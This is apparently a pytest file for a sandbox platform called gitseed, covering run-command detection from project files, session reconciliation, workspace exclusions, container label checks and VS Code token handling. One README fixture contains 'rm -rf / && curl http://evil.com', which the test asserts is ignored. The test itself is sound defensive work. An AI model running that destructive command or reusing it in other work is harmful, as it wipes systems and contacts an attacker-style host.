from __future__ import annotations

import json
from typing import Any
from unittest.mock import AsyncMock, patch

import pytest
from gitseed_common.enums import BackendType, OrgRole, SandboxStatus
from gitseed_core.models.backend import Backend
from gitseed_core.models.project import Project, ProjectRepository
from gitseed_core.models.sandbox import SandboxSession
from gitseed_core.models.user import User
from gitseed_core.services.compute_runtime import session_workspace_volume_name
from gitseed_core.services.errors import Forbidden, NotFound
from gitseed_core.services.sandbox_detect import (
    _apply_project_sandbox_overrides,
    _extract_doc_command_hints,
    _parse_pyproject_entrypoints,
    get_sandbox_run_config,
)
from gitseed_core.services.sandboxes import (
    get_sandbox_session,
    list_sandbox_sessions,
)
from gitseed_core.services.session_vscode import (
    _VSCODE_SESSIONS,
    VSCODE_BUNDLE_VOLUME,
    VSCODE_MOUNT_PATH,
    VsCodeSessionState,
    _default_vscode_settings_dict,
    _verify_managed_session_container,
    close_session_vscode,
    resolve_verified_vscode_state,
)
from gitseed_core.services.session_workspace import is_ignored_path


class _ScalarResult:
    def __init__(self, items: list[Any]) -> None:
        self._items = items

    def scalars(self) -> _ScalarResult:
        return self

    def all(self) -> list[Any]:
        return list(self._items)


def _make_actor_and_project(
    sandbox_config: dict[str, Any] | None = None,
) -> tuple[User, Project, ProjectRepository]:
    actor = User(
        id="usr_1",
        email="dev@example.com",
        name="Dev User",
        org_role=OrgRole.ADMIN,
    )
    project = Project(
        id="prj_1",
        name="Demo Project",
        slug="demo",
        sandbox_config=sandbox_config or {},
    )
    repo = ProjectRepository(
        id=10,
        project_id=project.id,
        backend_id="bck_git",
        full_name="org/demo",
        default_branch="main",
        is_primary=True,
    )
    return actor, project, repo


class TestSandboxDetectHeuristics:
    def test_extract_doc_command_hints_and_pyproject_entrypoints(self) -> None:
        readme = """
# Demo Service
```bash
$ pnpm install
$ pnpm run start
$ pnpm test
$ rm -rf / && curl http://evil.com
```
"""
        hints = _extract_doc_command_hints(readme)
        assert hints == {
            "setup_command": "pnpm install",
            "run_command": "pnpm run start",
            "test_command": "pnpm test",
        }

        pyproject_toml = """
[project]
name = "demo-cli"
[project.scripts]
demo-cli = "demo_pkg.cli:main"
"""
        assert _parse_pyproject_entrypoints(pyproject_toml) == {
            "run_command": "demo-cli"
        }

    @pytest.mark.asyncio
    async def test_detects_gitseed_run_json_first(self) -> None:
        actor, project, repo = _make_actor_and_project()
        session = AsyncMock()
        session.execute.return_value = _ScalarResult([repo])

        run_json_payload = {
            "image": "python:3.12-slim",
            "setup_command": "pip install -e .",
            "run_command": "python -m app",
            "test_command": "pytest -q",
            "artifact_globs": ["dist/*.whl"],
        }

        with (
            patch(
                "gitseed_core.services.sandbox_detect.projects_service.get_project",
                return_value=project,
            ),
            patch(
                "gitseed_core.services.sandbox_detect.git_browse.get_repo_blob",
                return_value={"content": json.dumps(run_json_payload)},
            ),
        ):
            cfg = await get_sandbox_run_config(session, actor, project.id)

        assert cfg["source"] == "run_json"
        assert cfg["image"] == "python:3.12-slim"
        assert cfg["setup_command"] == "pip install -e ."
        assert cfg["run_command"] == "python -m app"
        assert cfg["test_command"] == "pytest -q"
        assert cfg["artifact_globs"] == ["dist/*.whl"]

    @pytest.mark.asyncio
    async def test_detects_pyproject_toml_stack(self) -> None:
        actor, project, repo = _make_actor_and_project()
        session = AsyncMock()
        session.execute.return_value = _ScalarResult([repo])

        async def _get_blob(
            _s: Any, _a: Any, _pid: str, _rid: int, *, ref: str, path: str
        ) -> dict[str, Any]:
            if path == ".gitseed/run.json":
                raise FileNotFoundError("no run.json")
            if path == "pyproject.toml":
                return {
                    "content": '[project]\nname = "app"\n[project.scripts]\nmy-app = "app.main:run"\n'
                }
            return {"content": ""}

        with (
            patch(
                "gitseed_core.services.sandbox_detect.projects_service.get_project",
                return_value=project,
            ),
            patch(
                "gitseed_core.services.sandbox_detect.git_browse.get_repo_blob",
                side_effect=_get_blob,
            ),
            patch(
                "gitseed_core.services.sandbox_detect.git_browse.get_repo_tree",
                return_value={
                    "entries": [{"name": "pyproject.toml"}, {"name": "README.md"}],
                    "readme": {"content": ""},
                },
            ),
        ):
            cfg = await get_sandbox_run_config(session, actor, project.id)

        assert cfg["source"] == "auto_detected"
        assert cfg["image"] == "python:3.12-slim"
        assert "pip install" in (cfg["setup_command"] or "")
        assert cfg["run_command"] == "my-app"
        assert cfg["test_command"] == "pytest -v"

    @pytest.mark.asyncio
    async def test_detects_package_json_with_npm_and_pnpm_hints(self) -> None:
        actor, project, repo = _make_actor_and_project()
        session = AsyncMock()
        session.execute.return_value = _ScalarResult([repo])

        async def _get_blob(
            _s: Any, _a: Any, _pid: str, _rid: int, *, ref: str, path: str
        ) -> dict[str, Any]:
            if path == ".gitseed/run.json":
                raise FileNotFoundError("no run.json")
            if path == "package.json":
                return {
                    "content": json.dumps(
                        {"name": "web", "scripts": {"dev": "vite", "test": "vitest"}}
                    )
                }
            return {"content": ""}

        with (
            patch(
                "gitseed_core.services.sandbox_detect.projects_service.get_project",
                return_value=project,
            ),
            patch(
                "gitseed_core.services.sandbox_detect.git_browse.get_repo_blob",
                side_effect=_get_blob,
            ),
            patch(
                "gitseed_core.services.sandbox_detect.git_browse.get_repo_tree",
                return_value={
                    "entries": [{"name": "package.json"}, {"name": "pnpm-lock.yaml"}],
                    "readme": {
                        "content": "```bash\npnpm install\npnpm dev\n```"
                    },
                },
            ),
        ):
            cfg = await get_sandbox_run_config(session, actor, project.id)

        assert cfg["source"] == "auto_detected"
        assert cfg["image"] == "node:22-bookworm-slim"
        assert cfg["setup_command"] == "pnpm install"
        assert cfg["run_command"] == "pnpm dev"
        assert cfg["test_command"] == "npm test"

    @pytest.mark.asyncio
    async def test_detects_cargo_toml_and_go_mod(self) -> None:
        actor, project, repo = _make_actor_and_project()
        session = AsyncMock()
        session.execute.return_value = _ScalarResult([repo])

        # Cargo.toml
        with (
            patch(
                "gitseed_core.services.sandbox_detect.projects_service.get_project",
                return_value=project,
            ),
            patch(
                "gitseed_core.services.sandbox_detect.git_browse.get_repo_blob",
                side_effect=FileNotFoundError("missing"),
            ),
            patch(
                "gitseed_core.services.sandbox_detect.git_browse.get_repo_tree",
                return_value={
                    "entries": [{"name": "Cargo.toml"}],
                    "readme": {"content": ""},
                },
            ),
        ):
            rust_cfg = await get_sandbox_run_config(session, actor, project.id)

        assert rust_cfg["image"] == "rust:1.82-slim"
        assert rust_cfg["run_command"] == "cargo run"
        assert rust_cfg["test_command"] == "cargo test"

        # go.mod
        with (
            patch(
                "gitseed_core.services.sandbox_detect.projects_service.get_project",
                return_value=project,
            ),
            patch(
                "gitseed_core.services.sandbox_detect.git_browse.get_repo_blob",
                side_effect=FileNotFoundError("missing"),
            ),
            patch(
                "gitseed_core.services.sandbox_detect.git_browse.get_repo_tree",
                return_value={
                    "entries": [{"name": "go.mod"}],
                    "readme": {"content": ""},
                },
            ),
        ):
            go_cfg = await get_sandbox_run_config(session, actor, project.id)

        assert go_cfg["image"] == "golang:1.23-alpine"
        assert go_cfg["run_command"] == "go run ."
        assert go_cfg["test_command"] == "go test ./..."

        # Project overrides
        overridden = _apply_project_sandbox_overrides(
            go_cfg, {"test_command": "go test -race ./..."}
        )
        assert overridden["source"] == "project_settings"
        assert overridden["test_command"] == "go test -race ./..."


class TestSandboxSessionReconciliationOptimization:
    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "terminal_status",
        [
            SandboxStatus.SUCCEEDED,
            SandboxStatus.FAILED,
            SandboxStatus.STOPPED,
            SandboxStatus.TIMED_OUT,
        ],
    )
    async def test_get_sandbox_session_skips_reconcile_and_commit_when_terminal(
        self, terminal_status: SandboxStatus
    ) -> None:
        actor, project, _ = _make_actor_and_project()
        sbx = SandboxSession(
            id="sbx_term",
            project_id=project.id,
            ref="main",
            command="pytest",
            status=terminal_status,
        )
        session = AsyncMock()
        session.get.return_value = sbx

        with (
            patch(
                "gitseed_core.services.sandboxes.projects_service.get_project",
                return_value=project,
            ),
            patch(
                "gitseed_core.services.sandboxes.reconcile_sandbox_sessions",
                new_callable=AsyncMock,
            ) as mock_reconcile,
        ):
            res = await get_sandbox_session(session, actor, project.id, sbx.id)

        assert res is sbx
        mock_reconcile.assert_not_awaited()
        session.commit.assert_not_awaited()

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "active_status",
        [SandboxStatus.STARTING, SandboxStatus.RUNNING],
    )
    async def test_get_sandbox_session_reconciles_and_commits_when_active(
        self, active_status: SandboxStatus
    ) -> None:
        actor, project, _ = _make_actor_and_project()
        sbx = SandboxSession(
            id="sbx_active",
            project_id=project.id,
            ref="main",
            command="pytest",
            status=active_status,
        )
        session = AsyncMock()
        session.get.return_value = sbx

        with (
            patch(
                "gitseed_core.services.sandboxes.projects_service.get_project",
                return_value=project,
            ),
            patch(
                "gitseed_core.services.sandboxes.reconcile_sandbox_sessions",
                new_callable=AsyncMock,
            ) as mock_reconcile,
        ):
            res = await get_sandbox_session(session, actor, project.id, sbx.id)

        assert res is sbx
        mock_reconcile.assert_awaited_once_with(session)
        session.commit.assert_awaited_once()
        session.refresh.assert_awaited_once_with(sbx)

    @pytest.mark.asyncio
    async def test_list_sandbox_sessions_only_reconciles_when_active_exists(
        self,
    ) -> None:
        actor, project, _ = _make_actor_and_project()
        sbx = SandboxSession(
            id="sbx_1",
            project_id=project.id,
            ref="main",
            command="pytest",
            status=SandboxStatus.SUCCEEDED,
        )
        session = AsyncMock()
        session.execute.return_value = _ScalarResult([sbx])

        with (
            patch(
                "gitseed_core.services.sandboxes.projects_service.get_project",
                return_value=project,
            ),
            patch(
                "gitseed_core.services.sandboxes.reconcile_sandbox_sessions",
                new_callable=AsyncMock,
            ) as mock_reconcile,
        ):
            # 1. No active sandbox (session.scalar returns None)
            session.scalar.return_value = None
            rows = await list_sandbox_sessions(session, actor, project.id)
            assert rows == [sbx]
            mock_reconcile.assert_not_awaited()
            session.commit.assert_not_awaited()

            # 2. Active sandbox exists (session.scalar returns an id)
            session.scalar.return_value = "sbx_active"
            rows2 = await list_sandbox_sessions(session, actor, project.id)
            assert rows2 == [sbx]
            mock_reconcile.assert_awaited_once_with(session)
            session.commit.assert_awaited_once()


class TestSessionWorkspaceVolumesAndVsCode:
    def test_session_workspace_volume_name_and_vscode_exclusions(self) -> None:
        assert session_workspace_volume_name("ses_abc123") == "gitseed-ws-ses_abc123"
        assert VSCODE_BUNDLE_VOLUME == "gitseed-vscode-bundle"
        assert VSCODE_MOUNT_PATH == "/opt/.gitseed-vscode"
        # VS Code data/extension directories must never leak into Push to seed
        assert is_ignored_path(".gitseed-vscode/data/User/settings.json")
        assert is_ignored_path(".openvscode-server/extensions/ms-python.python/package.json")
        assert is_ignored_path(".vscode-server/bin/server.sh")
        assert is_ignored_path("src/app.py") is False

    def test_verify_managed_session_container_enforces_gitseed_labels(self) -> None:
        # Unmanaged container must be rejected before any docker exec
        with pytest.raises(Forbidden):
            _verify_managed_session_container(
                {"Config": {"Labels": {}}, "State": {"Running": True}},
                kind="terminal",
                session_id="sbx_1",
                project_id="prj_1",
            )

        # Wrong session ID must be rejected
        with pytest.raises(Forbidden):
            _verify_managed_session_container(
                {
                    "Config": {
                        "Labels": {
                            "app.gitseed.managed": "true",
                            "app.gitseed.sandbox_id": "sbx_other",
                            "app.gitseed.project_id": "prj_1",
                        }
                    },
                    "State": {"Running": True},
                },
                kind="terminal",
                session_id="sbx_1",
                project_id="prj_1",
            )

        # Valid managed session container passes
        _verify_managed_session_container(
            {
                "Config": {
                    "Labels": {
                        "app.gitseed.managed": "true",
                        "app.gitseed.sandbox_id": "sbx_1",
                        "app.gitseed.project_id": "prj_1",
                    }
                },
                "State": {"Running": True},
            },
            kind="terminal",
            session_id="sbx_1",
            project_id="prj_1",
        )

    @pytest.mark.asyncio
    async def test_vscode_token_verification_and_revocation_on_close(self) -> None:
        backend = Backend(
            id="bck_docker",
            name="Docker",
            type=BackendType.COMPUTE,
            provider="docker",
        )
        key = "sandbox:sbx_tok_test"
        _VSCODE_SESSIONS[key] = VsCodeSessionState(
            session_key=key,
            kind="terminal",
            session_id="sbx_tok_test",
            project_id="prj_1",
            backend=backend,
            container_id="cid_1",
            token="secret_tok_123",
            mode="in_container",
        )
        state = resolve_verified_vscode_state(key, "secret_tok_123")
        assert state.session_id == "sbx_tok_test"

        with pytest.raises(NotFound):
            resolve_verified_vscode_state(key, "wrong_token")

        await close_session_vscode(key)
        with pytest.raises(NotFound):
            resolve_verified_vscode_state(key, "secret_tok_123")

    @pytest.mark.asyncio
    async def test_vscode_cross_worker_recovery_via_redis(self) -> None:
        from gitseed_core.services.session_vscode import (
            _derive_vscode_token,
            _persist_vscode_state_redis,
            resolve_or_recover_vscode_state,
        )

        backend = Backend(
            id="bck_docker",
            name="Docker",
            type=BackendType.COMPUTE,
            provider="docker",
            enabled=True,
        )
        key = "sandbox:sbx_redis_recover"
        det_token = _derive_vscode_token(key, "cid_redis_1")
        state = VsCodeSessionState(
            session_key=key,
            kind="terminal",
            session_id="sbx_redis_recover",
            project_id="prj_1",
            backend=backend,
            container_id="cid_redis_1",
            token=det_token,
            mode="sidecar",
            sidecar_container_id="cid_sidecar_1",
        )
        fake_store: dict[str, str] = {}

        class _FakeRedis:
            async def set(self, k: str, v: str, ex: int | None = None) -> None:
                fake_store[k] = v

            async def get(self, k: str) -> str | None:
                return fake_store.get(k)

            async def delete(self, k: str) -> None:
                fake_store.pop(k, None)

        fake_redis = _FakeRedis()

        with patch(
            "gitseed_core.services.session_vscode.get_redis",
            return_value=fake_redis,
        ):
            await _persist_vscode_state_redis(state)
            _VSCODE_SESSIONS.pop(key, None)

            recovered = await resolve_or_recover_vscode_state(key, det_token)
            assert recovered.session_id == "sbx_redis_recover"
            assert recovered.sidecar_container_id == "cid_sidecar_1"
            assert key in _VSCODE_SESSIONS

            await close_session_vscode(key)

    def test_vscode_default_settings_hide_secondary_pane_and_titlebar_controls(self) -> None:
        cfg = _default_vscode_settings_dict("dark")
        assert cfg["workbench.colorTheme"] == "Default Dark Modern"
        assert cfg["workbench.sideBar.location"] == "left"
        assert cfg["workbench.secondarySideBar.defaultVisibility"] == "hidden"
        assert cfg["window.commandCenter"] is False
        assert cfg["workbench.navigationControl.enabled"] is False
        assert cfg["workbench.layoutControl.enabled"] is False
        assert cfg["chat.commandCenter.enabled"] is False
        assert cfg["chat.disableAIFeatures"] is True
        assert cfg["chat.agent.enabled"] is False

